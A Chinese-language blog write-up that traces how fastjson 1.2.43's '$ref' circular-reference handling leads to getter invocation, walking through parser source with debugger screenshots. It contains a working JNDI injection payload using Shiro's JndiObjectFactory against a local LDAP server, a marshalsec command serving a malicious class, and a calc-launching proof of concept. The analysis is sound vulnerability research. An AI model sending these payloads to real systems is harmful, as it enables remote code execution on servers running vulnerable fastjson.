前言
--

虽然 网上已经有很多`fastjson` 的 `payload` ，并且分析漏洞的文章也不在少数了，但是我发现好像没什么分析 `循环引用（$ref）`这个属性的

在学习 `fastjson`漏洞的时候尝试进行了一些分析记录下来。

如果有错误希望师傅们斧正

本篇文章不会从 `fastjson`漏洞的原理讲起，建议师傅们先学习漏洞的成因以及调试一些 `fastjson`内部的代码

这里推荐两篇我看过的很好的的文章：

<https://xz.aliyun.com/t/7027>

<https://www.yuque.com/tianxiadamutou/zcfd4v/xehnw7#dfe50187>

环境部署
----

此次实验环境使用的是 `fastjson 1.2.43` +`jdk1.8.161`

测试代码：

```php
  String payload ="{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\"," +
                "\"ResourceName\":\"ldap://127.0.0.1:1389/ldapServer\"," +
                "\"a\":{\"$ref\":\"$.instance\"}}"
                ;
  JSON.parse(payload);
```

`1389`是通过 `marshalsec` 开启的 LADP 服务器

```php
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#ldapServer 1389
```

`8000`端口是我用 `python`开的服务器，上面挂在着 `ldapServer.class`恶意类（弹服务器）

漏洞分析
----

这个 `payload`会自动触发 `JndiObjectFactory` 的 `getInstance`函数，然后执行 `lookup`最终运行恶意代码。

那是怎么触发的呢，我们可以首先进入 `parse`找到：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f1d70c3fbcb920001d9310fd5a38a357787650bb.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f1d70c3fbcb920001d9310fd5a38a357787650bb.png)

进入 `handleResovleTask`：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-57cb82050f78aff1cb65626c2f3ba2aa7bee3933.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-57cb82050f78aff1cb65626c2f3ba2aa7bee3933.png)

这里循环了 `resolveTaskList`，想知道它是在哪里添加的，我们可以在：

`addResolveTask`函数上下断点。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-554cf63ed77d9776c276c11ccf6eb6ddd94f1e8a.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-554cf63ed77d9776c276c11ccf6eb6ddd94f1e8a.png)

执行到此处以后我们向前找到几个函数：

当 `fastjson`在解析字段时，会执行到 `parseField`：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a4f705caa6a7be02002b6f06b1a4eede9b5994ff.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a4f705caa6a7be02002b6f06b1a4eede9b5994ff.png)

通常情况下，如果类里面存在指定的字段，那就会在此处返回一个对象，但是我们指定的 `instance`是不在 `JndiObjectFactory`类的。

然后就会执行到下面：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bfd932551387d2b6d08f08914f2fb3a9c7c26b5a.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bfd932551387d2b6d08f08914f2fb3a9c7c26b5a.png)

进入 `parseExtra`后：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-168cc9446bec8595c938710c2044e07e1e2b1e59.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-168cc9446bec8595c938710c2044e07e1e2b1e59.png)

再次进入 `parse` 看到此处:

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-020b6f9e9a87c432e9043eb6ca26b1a83b79a25c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-020b6f9e9a87c432e9043eb6ca26b1a83b79a25c.png)

为什么会进入 `case 12`呢，我们可以在 `JSONLexerBase`类发现当字符是 `{`时 `token` 赋值为 `12`

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4a5b0c3640549f48f428a9e3aaea816209a13e67.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4a5b0c3640549f48f428a9e3aaea816209a13e67.png)

进入 `parseObject`，大概到 `287` 行:

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a7988680a92fcead03ef73bed0242f5e3caf003c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a7988680a92fcead03ef73bed0242f5e3caf003c.png)

通过上面的词法分析会取得 `key`为 `$ref`，`ref`为 `$.instance`

然后再下面一些：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fc649c70600e85de1ee995d5ccd6d9b970c30aea.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fc649c70600e85de1ee995d5ccd6d9b970c30aea.png)

此处判断了如果 `ref` 不为 `@`、`..`、`$` 就进入最后的 `else`，然后进入我们最开始的的 `addResolveTask`函数。

回到最开始的 `handleResovleTask`函数：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-336fff0c93324132ccbb33be91cb96c8b804badd.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-336fff0c93324132ccbb33be91cb96c8b804badd.png)

此处的 `ref`为 `$.instance` ，最终进入 `JSONPath.eval`：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-aa707542cb8e3e5224de9201b7199446fad1afd6.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-aa707542cb8e3e5224de9201b7199446fad1afd6.png)

再次进入 `eval`，但是此处我们需要注意一个变量，就是第一个参数为 `JndiObjectFactory`这个类

他的 `resourceName`已经是指向我们的恶意 `LDAP`服务器了，我们只需要触发这个类的 `getInstance`函数即可了。

再次进入 `eval`：

```php
 public Object eval(JSONPath path, Object rootObject, Object currentObject) {
    if (this.deep) {
        ....
    } else {
        // 进入此处
        return path.getPropertyValue(currentObject, this.propertyName, this.propertyNameHash);
    }
}
```

需要注意这里的 `this.propertyName`为 `instance`，接着进入 `getPropertyValue`:

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-45431f9669ac9cad82321ca4617932100e93b80e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-45431f9669ac9cad82321ca4617932100e93b80e.png)

此处稍微解释一下 `getJavaBeanSerializer` 函数：

根据传进的类（此处为 JndiObjectFactory ）获得类中的方法

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d148e5430063eb538c159fde31f9c431eea1bad3.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d148e5430063eb538c159fde31f9c431eea1bad3.png)

如果函数名中有 `get` 并且符合一定条件就会加入到 `getters`。

接着看代码:

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e114bc03e4862943b1f3e6ff5376358f63a26e2b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e114bc03e4862943b1f3e6ff5376358f63a26e2b.png)

这里的 `propertyName`依然为 `instance`

会发现第三个参数为 `propertyNameHash`，根据名字可以知道这是第二次参数的 `hash`值。

进入 `getFieldValue`函数：

```php
    public Object getFieldValue(Object object, String key, long keyHash, boolean throwFieldNotFoundException) {
        // 根据 keyHash 获得字段的值
        FieldSerializer fieldDeser = this.getFieldSerializer(keyHash);
        if (fieldDeser == null) {
            .....
        } else {
            try {
                return fieldDeser.getPropertyValue(object);
            } catch (InvocationTargetException var8) {
                throw new JSONException("getFieldValue error." + key, var8);
            } catch (IllegalAccessException var9) {
                throw new JSONException("getFieldValue error." + key, var9);
            }
        }
    }
```

放出一个 `fieldDeser`属性截图，此处的 `method`为 `getInstance`：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c809df9a09a23defe63a974537c96329402baaaf.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c809df9a09a23defe63a974537c96329402baaaf.png)

然后进入 `getPropertyValue`：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8bcba2ee534221185463578d1a78ec2b39d2ec38.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8bcba2ee534221185463578d1a78ec2b39d2ec38.png)

进入 `FieldInfo`类的 `get` 方法：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-02eb9d90aa0722fd13f66eef8b065cd5ded613d7.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-02eb9d90aa0722fd13f66eef8b065cd5ded613d7.png)

此处 `method`不为空，调用 `getInstance`:

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0f9d2673c01fde11a77382e22625a6399bcea6c0.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0f9d2673c01fde11a77382e22625a6399bcea6c0.png)

触发 `lookup` 获取恶 `class`执行代码。

其实我们不一定需要用到什么固定的类，我们甚至可以本地搭建一个进行测试

本地新建一个类：

```php
public class TestObject {
    public String getHaha() throws IOException {
        Runtime.getRuntime().exec("calc");
        return "1";
    }
}
```

然后我们测试代码：

```php
String payload ="{\"@type\":\"TestObject\",\"haha\":{\"$ref\":\"$.Haha\"}}";
JSON.parse(payload);
```

会发现依然可以弹出计算器，说明我们的分析大致是没什么问题的。

总结
--

本文没什么高深的技术，因为是初学，对分析过程的一个记录，分析过程可能也存在一定错误，如果发现哪里讲得不对，希望师傅们可以即使指出。一起学习